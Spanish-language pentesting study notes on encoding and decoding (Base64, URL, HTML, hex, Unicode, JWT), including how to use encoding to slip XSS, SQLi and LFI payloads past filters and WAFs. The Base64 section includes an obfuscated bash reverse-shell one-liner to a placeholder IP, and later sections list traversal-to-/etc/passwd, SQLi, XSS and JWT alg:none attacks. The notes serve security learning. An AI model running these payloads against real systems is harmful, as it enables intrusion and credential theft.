# Encoding / Decoding

Tags: #Encoding #Decoding #Base64 #URL #HTML #Hex #Unicode #BypassFiltros #Web

## OBJETIVO

- Entender y aplicar diferentes tipos de encoding en contextos de pentesting
- Usar encoding para bypassear filtros de WAF, XSS, SQLi y LFI
- Decodificar datos encontrados durante la enumeración
- Identificar qué tipo de encoding se está usando en una respuesta

## TIPS

1. **Identificar el encoding antes de decodificar → no todos los strings son Base64**
2. **Double encoding → cuando el primer encoding es filtrado → encodear dos veces**
3. **CyberChef → la herramienta más útil para identificar y convertir encodings**
4. **URL encoding → obligatorio en parámetros GET → espacios y caracteres especiales**
5. **Base64 siempre termina con = o == → fácil de identificar**
6. **Los filtros de WAF muchas veces no decodifican Unicode o Hex → úsalos para bypass**

## RECURSOS

```bash
❯ https://gchq.github.io/CyberChef/         # Navaja suiza del encoding → usar siempre
❯ https://www.ascii-code.com/               # Tabla ASCII completa
❯ https://www.utf8-chartable.de/            # Unicode UTF-8
❯ https://www.charset.org/                  # CharSets disponibles
❯ https://www.w3schools.com/               # HTML encoding reference
❯ https://www.urlencoder.org/               # URL encoder/decoder online
❯ https://jwt.io/                           # Decodificar y analizar JWT tokens
```

---

## 1. BASE64

### Características

```
- Caracteres: A-Z, a-z, 0-9, +, /
- Siempre termina en = o == (padding)
- Aumenta el tamaño ~33% respecto al original
- Identificar: string largo con letras/números y = al final
```

### Comandos en Kali

```bash
❯ echo -n 'texto' | base64
# Encodear texto → -n → sin salto de línea al final

❯ echo -n 'texto' | base64 -w 0
# -w 0 → sin saltos de línea en el output → útil para copiar

❯ echo 'dGV4dG8=' | base64 -d
# Decodear string base64

❯ base64 archivo.jpg
# Encodear archivo completo → útil para transferir por texto

❯ base64 -w 0 script.sh
# Encodear script sin saltos de línea → para copiar/pegar en consola

❯ base64 -d <<< 'dGV4dG8='
# Decodear sin echo

❯ cat archivo.b64 | base64 -d > archivo_original
# Decodear archivo y guardar

# En Python
❯ python3 -c "import base64; print(base64.b64encode(b'texto').decode())"
❯ python3 -c "import base64; print(base64.b64decode('dGV4dG8=').decode())"
```

### Uso en pentesting

```bash
# Transferir archivos cuando no hay red
❯ base64 -w 0 linpeas.sh | xclip -sel clip
# Copiar al portapapeles → pegar en la consola de la víctima
# En la víctima: echo <string> | base64 -d > linpeas.sh

# Identificar tokens o credenciales en base64
# En respuestas HTTP: Authorization: Basic dXNlcjpwYXNz
❯ echo 'dXNlcjpwYXNz' | base64 -d
# → user:pass

# Ofuscar payloads para bypass de filtros
❯ echo -n 'bash -i >& /dev/tcp/IP/443 0>&1' | base64
# Ejecutar en la víctima: bash -c {echo,<base64>}|{base64,-d}|bash
```

---

## 2. URL ENCODING

### Caracteres comunes

```
Espacio = %20 (o +)
!  = %21      "  = %22      #  = %23      $  = %24
%  = %25      &  = %26      '  = %27      (  = %28
)  = %29      *  = %2A      +  = %2B      ,  = %2C
/  = %2F      :  = %3A      ;  = %3B      <  = %3C
=  = %3D      >  = %3E      ?  = %3F      @  = %40
[  = %5B      \  = %5C     ]  = %5D      ^  = %5E
{  = %7B      |  = %7C      }  = %7D      ~  = %7E
```

### Comandos en Kali

```bash
❯ python3 -c "import urllib.parse; print(urllib.parse.quote('texto con espacios'))"
# Encodear string

❯ python3 -c "import urllib.parse; print(urllib.parse.unquote('%3Cscript%3E'))"
# Decodear URL encoded

❯ python3 -c "from urllib.parse import quote; print(quote('<script>alert(1)</script>', safe=''))"
# Encodear payload completo → safe='' para encodear todos los caracteres especiales

# En curl → encodear datos de formulario
❯ curl -X POST http://IP/login --data-urlencode "user=admin" --data-urlencode "pass=p@ss!word"
# --data-urlencode → encodea automáticamente los valores
```

### Uso en pentesting — Bypass de filtros

```bash
# XSS con URL encoding
<script>alert(1)</script>  →  %3Cscript%3Ealert%281%29%3C%2Fscript%3E

# LFI con URL encoding
../etc/passwd  →  %2E%2E%2F%65%74%63%2F%70%61%73%73%77%64

# Double URL encoding → cuando el servidor decodifica dos veces
../  →  %252E%252E%252F
# %25 es el encoding de % → al decodificar %25 → % → luego %2E → .

# SQLi con encoding
' OR 1=1--  →  %27%20OR%201%3D1--
```

---

## 3. HTML ENCODING

### Entidades HTML comunes

```
<  = &lt;      >  = &gt;
&  = &amp;     "  = &quot;    '  = &apos; o &#39;
   = &nbsp;    /  = &#47;
```

### Encoding numérico (decimal y hex)

```
<  = &#60;  o  &#x3C;
>  = &#62;  o  &#x3E;
'  = &#39;  o  &#x27;
"  = &#34;  o  &#x22;
```

### Comandos en Kali

```bash
❯ python3 -c "import html; print(html.escape('<script>alert(1)</script>'))"
# Encodear → &lt;script&gt;alert(1)&lt;/script&gt;

❯ python3 -c "import html; print(html.unescape('&lt;script&gt;'))"
# Decodear entidades HTML
```

### Uso en pentesting — XSS bypass

```bash
# Cuando filtran < y > → usar entidades HTML
<script>  →  &lt;script&gt;
# El navegador renderiza las entidades → puede ejecutar JS en algunos contextos

# Encoding decimal en atributos
<img src=x onerror="alert(1)">
# → <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

# Mezclar encodings para bypass
<script>alert(1)</script>
→ <script>&#97;lert(1)</script>
# El navegador completa el decode → ejecuta alert
```

### Ejemplo PHP — sanitización HTML

```php
# Crear archivo de prueba
❯ nvim html_encoded.php

<!DOCTYPE html>
<html>
    <head><title>HTML Encoding</title></head>
    <body>
        <h1>This is a simple html</h1>
        <?php
            $userInput = $_GET['input'];
            $sanitizedInput = htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
            echo "<p>User input: $sanitizedInput</p>";
        ?>
    </body>
</html>

# Probar inyección → sin sanitizar
❯ http://localhost/html_encoded.php?input=<strong>Omar</strong>
❯ http://localhost/html_encoded.php?input=<script>alert("XSS")</script>
```

---

## 4. HEX ENCODING

### Comandos en Kali

```bash
❯ echo -n 'texto' | xxd
# Ver representación hex del texto

❯ echo -n 'texto' | xxd -p
# Solo el hex → sin formato adicional → más limpio

❯ echo '74657874 6f' | xxd -r -p
# Convertir hex a texto

❯ python3 -c "print('texto'.encode().hex())"
# Hex desde Python → 74657874 6f

❯ python3 -c "print(bytes.fromhex('74657874 6f'.replace(' ','')))"
# Decodear hex con Python

# Convertir hex con espacios a texto
❯ echo '50 40 73 73 77 30 72 64' | xargs | xxd -ps -r
```

### Uso en pentesting

```bash
# SQLi con encoding hex → bypassar filtros de comillas
SELECT * FROM users WHERE name = 'admin'
# → SELECT * FROM users WHERE name = 0x61646d696e
# 0x → prefijo hex en SQL → no necesita comillas

# XSS con hex
<script>  →  \x3cscript\x3e  (en contextos JavaScript)

# En URLs como encoding alternativo
../  →  ..%2F  →  ..%c0%af  (doble byte encoding)
```

---

## 5. UNICODE ENCODING

```bash
# Formatos de Unicode
\u0041   # Formato JavaScript → A
\U00000041  # Formato Python
%u0041   # Formato URL Unicode (IE legacy)
&#x41;   # HTML hex entity → A

# Comandos en Python
❯ python3 -c "print('\u003cscript\u003e')"
# → <script>  (Python evalúa el unicode)

❯ python3 -c "print('<script>'.encode('unicode_escape').decode())"
# Encodear a unicode escape

❯ python3 -c "print('\\u003cscript\\u003e'.encode().decode('unicode_escape'))"
# Decodear unicode escape
```

### Uso en pentesting — Bypass

```bash
# XSS con Unicode → cuando filtran < y >
<script>  →  \u003cscript\u003e

# Path traversal con Unicode → bypass de filtros ../
../  →  ..%u2215  (slash alternativo U+2215)
../  →  ..%uEFC8  (slash de compatibilidad)
```

---

## 6. IDENTIFICAR TIPO DE ENCODING

```bash
# Indicios visuales
dGVzdA==         → Base64 (termina en =, caracteres alfanuméricos)
%3Cscript%3E     → URL encoding (% seguido de hex)
&lt;script&gt;   → HTML entities (& seguido de letras ;)
74657374         → Hex puro (solo 0-9 y a-f)
\u003c          → Unicode escape (\u seguido de 4 hex)
eyJ...           → JWT (Base64 con tres partes separadas por .)

# Con CyberChef → Magic operation → detecta automáticamente el encoding
# https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')

# Con Python → intentar decodificar y ver si tiene sentido
❯ python3 -c "import base64; print(base64.b64decode('dGVzdA=='))"
```

---

## 7. JWT TOKENS

```bash
# JWT = Header.Payload.Signature (separados por .)
# Cada parte está en Base64url (similar a Base64 pero con - en vez de + y _ en vez de /)

# Decodear manualmente
❯ echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
# → {"alg":"HS256"}  (header)

# Con Python
❯ python3 -c "
import base64, json
token = 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.hash'
parts = token.split('.')
for part in parts[:2]:
    padding = 4 - len(part) % 4
    part += '=' * padding
    print(json.loads(base64.b64decode(part)))
"

# Herramientas online
# https://jwt.io/ → decodear y modificar JWT
# https://token.dev/ → alternativa

# Ataques comunes
# alg:none → quitar la firma
# Cambiar alg de RS256 a HS256 → usar clave pública como secreto HMAC
```

---

## 8. OTROS ENCODINGS ÚTILES

### ROT13

```bash
❯ echo 'texto' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# ROT13 → cifrado César con 13 posiciones

❯ python3 -c "import codecs; print(codecs.encode('texto', 'rot_13'))"
```

### MD5 / SHA (hashing — no encoding pero útil)

```bash
❯ echo -n 'texto' | md5sum
❯ echo -n 'texto' | sha1sum
❯ echo -n 'texto' | sha256sum
❯ echo -n 'texto' | sha512sum
# Hashing → one-way → no se decodea → se crackea
```

### Morse / Binary (CTF)

```bash
# En CyberChef → From Morse Code / From Binary
# Binario: 01110100 01100101 01111000 01110100 01101111 → texto
❯ python3 -c "print(''.join(chr(int(b,2)) for b in '01110100 01100101 01111000 01110100 01101111'.split()))"
```

---

## ONE-LINERS MENTALES

- String con = al final → probar Base64 primero
- % seguido de dos hex → URL encoding → python3 urllib.parse.unquote
- & con letras y ; → HTML entities → html.unescape
- Solo 0-9 y a-f con longitud par → Hex → xxd -r -p
- eyJ → JWT → decodear con base64 -d cada parte
- Filtro bloquea payload → probar URL encoding, double encoding, Unicode
- Bypass WAF → double URL encode → %25 en vez de %